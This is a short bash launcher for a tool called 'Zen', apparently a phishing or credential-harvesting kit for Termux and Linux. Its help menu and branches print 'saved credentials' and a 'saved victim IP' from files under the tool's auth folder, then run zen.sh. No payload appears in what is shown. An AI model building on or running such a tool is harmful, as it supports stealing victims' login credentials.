#!/bin/bash

# https://github.com/whydohumanssuck/zen

if [[ $(uname -o) == *'Android'* ]];then
	ZEN_ROOT="/data/data/com.termux/files/usr/opt/zen"
else
	export ZEN_ROOT="/opt/zen"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Zen type \`zen\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $ZEN_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ZEN_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $ZEN_ROOT
	bash ./zen.sh
fi
